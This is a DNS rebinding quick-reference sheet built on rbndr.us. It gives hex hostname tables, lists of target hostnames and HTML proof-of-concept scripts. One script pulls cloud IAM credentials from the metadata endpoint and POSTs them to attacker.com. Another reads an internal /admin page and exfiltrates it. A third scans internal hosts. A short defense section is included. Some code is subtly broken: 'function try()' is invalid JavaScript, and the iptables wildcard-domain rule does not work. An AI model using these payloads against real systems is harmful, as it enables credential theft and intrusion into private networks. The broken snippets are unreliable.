# DNS Rebinding Quick Reference

## IP Address Encoding (Hex)

| Dotted Quad | Hex (rbndr format) |
|-------------|-------------------|
| `127.0.0.1` | `7f000001` |
| `192.168.0.1` | `c0a80001` |
| `192.168.1.1` | `c0a80101` |
| `192.168.1.100` | `c0a80164` |
| `10.0.0.1` | `0a000001` |
| `172.16.0.1` | `ac100001` |
| `169.254.169.254` | `a9fea0fe` |
| `10.10.10.10` | `0a0a0a0a` |

**Formula:** `<hex-ip1>.<hex-ip2>.rbndr.us`

## Basic rbndr Usage

```bash
# Convert IP to hex
python3 -c "import struct,socket; print(hex(struct.unpack('!I',socket.inet_aton('192.168.1.100'))[0])[2:])"

# Generate rbndr hostname
echo "7f000001.c0a80001.rbndr.us"  # 127.0.0.1 <-> 192.168.0.1

# Test DNS resolution (should alternate)
host 7f000001.c0a80001.rbndr.us
host 7f000001.c0a80001.rbndr.us
host 7f000001.c0a80001.rbndr.us

# Run rbndr DNS server
sudo ./rbndr
sudo ./rbndr -p 5335  # custom port
```

## Attack Hostnames

```bash
# Access 127.0.0.1 via rebinding
host 7f000001.c0a80001.rbndr.us

# Access 192.168.1.100 (router admin)
host c0a80164.0a000001.rbndr.us

# Access cloud metadata endpoint
host a9fea0fe.c0a80001.rbndr.us

# Access 10.0.0.1 (internal service)
host 0a000001.c0a80001.rbndr.us
```

## PoC HTML Templates

### Basic Rebinding PoC

```html
<script>
var r = "7f000001.c0a80001.rbndr.us";
function try() {
    fetch("http://" + r + ":8080/admin")
        .then(r => r.text())
        .then(d => new Image().src = "http://attacker.com/log?d=" + btoa(d))
        .catch(() => setTimeout(try, 1000));
}
try();
</script>
```

### Cloud Metadata Exfil

```html
<script>
var m = "a9fea0fe.c0a80001.rbndr.us"; // 169.254.169.254
fetch("http://" + m + "/latest/meta-data/iam/security-credentials/")
    .then(r => r.text())
    .then(d => fetch("https://attacker.com/exfil", {method:"POST", body:d}));
</script>
```

### Internal Service Scanner

```html
<script>
var targets = ["c0a80001", "c0a80101", "0a000001"];
targets.forEach(ip => {
    var h = ip + ".c0a80001.rbndr.us";
    fetch("http://" + h + ":8080/")
        .then(r => console.log(h + " responded"))
        .catch(() => {});
});
</script>
```

## DNS Server Setup

```bash
# Local dnsmasq for testing
echo "address=/evil.com/203.0.113.1" | sudo tee -a /etc/dnsmasq.conf
sudo systemctl restart dnsmasq

# Verify DNS resolution
dig evil.com
nslookup evil.com
```

## Testing Commands

```bash
# Test rebinding with curl
curl --resolve 7f000001.c0a80001.rbndr.us:8080:127.0.0.1 \
  http://7f000001.c0a80001.rbndr.us:8080/admin

# Monitor DNS queries
tcpdump -i eth0 port 53 -n

# Check DNS TTL
dig +ttlunit 7f000001.c0a80001.rbndr.us

# Flush browser DNS cache
# Chrome: chrome://net-internals/#dns
# Firefox: about:networking#dns
```

## Conversion Python Script

```python
import socket, struct

def ip_to_hex(ip):
    return hex(struct.unpack('!I', socket.inet_aton(ip))[0])[2:]

def hex_to_ip(hex_str):
    return socket.inet_ntoa(struct.pack('!I', int(hex_str, 16)))

def make_rbndr(ip1, ip2):
    return f"{ip_to_hex(ip1)}.{ip_to_hex(ip2)}.rbndr.us"

# Examples
print(make_rbndr("127.0.0.1", "192.168.0.1"))  # 7f000001.c0a80001.rbndr.us
print(make_rbndr("169.254.169.254", "192.168.1.1"))  # a9fea0fe.c0a80101.rbndr.us
```

## Defense Detection

```bash
# Block rbndr.us at firewall
iptables -A OUTPUT -d *.rbndr.us -j DROP

# Monitor for low-TTL DNS
tcpdump -i eth0 port 53 -n -v 2>&1 | grep "ttl" | awk '{print $2}'

# Detect single-hostname multiple-IP pattern
tcpdump -i eth0 port 53 -n | grep "A?" | awk '{print $NF}' | sort | uniq -c
```

## Common Targets

| Target | IP | Hex |
|--------|-----|-----|
| Localhost | 127.0.0.1 | 7f000001 |
| AWS Metadata | 169.254.169.254 | a9fea0fe |
| GCP Metadata | 169.254.169.254 | a9fea0fe |
| Default Gateway | 192.168.1.1 | c0a80101 |
| Internal DNS | 10.0.0.1 | 0a000001 |
| Docker Host | 172.17.0.1 | ac110001 |

## Quick Hex Conversion Reference

| Dec | Hex | | Dec | Hex |
|-----|-----|-|-----|-----|
| 0 | 00 | | 128 | 80 |
| 1 | 01 | | 169 | a9 |
| 10 | 0a | | 172 | ac |
| 16 | 10 | | 192 | c0 |
| 127 | 7f | | 254 | fe |
| 169 | a9 | | 255 | ff |
